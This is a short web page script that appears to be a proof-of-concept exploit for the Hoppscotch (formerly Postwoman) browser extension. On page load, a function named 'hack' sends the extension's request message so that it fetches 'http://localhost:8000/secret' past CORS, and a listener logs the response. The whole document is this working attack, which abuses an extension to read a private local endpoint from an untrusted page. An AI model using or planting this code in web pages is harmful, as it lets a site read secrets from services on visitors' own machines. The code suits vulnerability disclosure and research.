<script>
    
        // step 1. set up listener for response from hoppscotch extension
        window.addEventListener('message', receiveMessage, false);
        
        function receiveMessage(event) {
          console.log (event.origin)
          console.log('Received message:', event.data);
        }
        
        // step 2. send request to any URL bypassing CORS using hoppscotch extension
        function hack(){ 
            window.postMessage(
            {
                "type": "__POSTWOMAN_EXTENSION_REQUEST__",
                "config": {
                    "method": "GET",
                    "url": "http://localhost:8000/secret",
                    "headers": {},
                    "params": {},
                    "data": null,
                    "wantsBinary": true
                }
            }
            )
        }
        setTimeout(hack, 2000);
        
        
    </script>